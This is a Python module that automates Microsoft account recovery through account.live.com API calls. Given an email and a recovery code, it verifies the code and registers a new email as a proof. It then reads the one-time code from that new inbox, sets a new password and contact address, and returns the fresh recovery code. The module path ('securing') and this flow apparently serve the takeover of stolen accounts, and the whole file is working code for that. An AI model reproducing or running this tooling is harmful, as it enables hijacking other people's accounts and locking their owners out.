from securing.utils.cookies.get_email_code import get_email_code
from urllib.parse import unquote
import logging
import codecs
import httpx
import json
import re

MS_HEADERS = {
    "Content-type": "application/json; charset=utf-8",
    "Accept": "application/json",
    "Referer": "https://account.live.com/",
    "Origin": "https://account.live.com",
    "hpgid": "200284",
    "hpgact": "0",
}


def _parse_json(response: httpx.Response, step: str) -> dict | None:
    if not response.text.strip():
        logging.error("%s: empty response (status %s)", step, response.status_code)
        return None

    try:
        data = response.json()
    except json.JSONDecodeError:
        logging.error(
            "%s: non-JSON response (status %s): %s",
            step,
            response.status_code,
            response.text[:500],
        )
        return None

    if "error" in data:
        err = data.get("error") or {}
        logging.error("%s: Microsoft error %s", step, err.get("code", data))
        return None

    return data


async def recover(session: httpx.AsyncClient, email: str, recovery_code: str, new_email: str, new_password: str):
    # Automates the recovery process through recovery code 
    
    data = await session.get(url=f"https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/oauth20_authorize.srf&mn={email}")
    logging.info(f"sRecovery: {data.text}")

    serverData = re.search(r"var\s+ServerData=(.*?)(?=;|$)", data.text)
    if not serverData:
        logging.error("recover: could not parse ServerData for %s", email)
        return "invalid"
    
    serverData = json.loads(serverData.group(1))
    decoded_token = codecs.decode(unquote(serverData["sRecoveryToken"]), "unicode_escape")

    recToken = await session.post(
        url = "https://account.live.com/API/Recovery/VerifyRecoveryCode",
        headers = {
            **MS_HEADERS,
            "canary": serverData["apiCanary"],
        },
        json = {
            "recoveryCode": recovery_code,
            "code": recovery_code,
            "scid": 100103,
            "token": decoded_token,
            "uiflvr": 1001
        }
    )

    recJson = _parse_json(recToken, "VerifyRecoveryCode")
    if not recJson or "apiCanary" not in recJson:
        return None

    canary = recJson["apiCanary"]
    token = recJson["token"]
    sendCode = await session.post(
        url = "https://account.live.com/api/Proofs/SendOtt", 
        headers = {
            **MS_HEADERS,
            "canary": canary,
        },
        json = {
            "associationType": "None",
            "action": "VerifyNewProof",
            "channel": "Email",
            "cxt": "MP",
            "proofId": new_email,
            "scid": 100103,
            "token": token,
            "uiflvr": 1001
        }
    )
    
    responseJson = _parse_json(sendCode, "SendOtt")
    if not responseJson or "apiCanary" not in responseJson:
        return None

    canary = responseJson["apiCanary"]
    code = await get_email_code(new_email)
    if not code:
        logging.error("recover: timed out waiting for OTP at %s", new_email)
        return None

    verifyCodeResponse = await session.post(
        url = "https://account.live.com/API/Proofs/VerifyCode",
        headers = {
            **MS_HEADERS,
            "canary": canary,
        },
        json = {
            "action": "VerifyOtc",
            "proofId": new_email,
            "scid": 100103,
            "token": token,
            "uiflvr": 1001,
            "code": code
        }
    )
    verifyCodeResponseJson = _parse_json(verifyCodeResponse, "VerifyCode")
    if not verifyCodeResponseJson or "apiCanary" not in verifyCodeResponseJson:
        return None

    canary = verifyCodeResponseJson["apiCanary"]

    finishSecure = await session.post(
        url = "https://account.live.com/API/Recovery/RecoverUser",
        headers = {
            **MS_HEADERS,
            "canary": canary,
        },
        json = {
            "contactEmail": new_email,
            "contactEpid": "",
            "password": new_password,
            "passwordExpiryEnabled": 0,
            "token": token,
        }
    )
    finishJson = _parse_json(finishSecure, "RecoverUser")
    if finishJson and "recoveryCode" in finishJson:
        return finishJson["recoveryCode"]

    return None
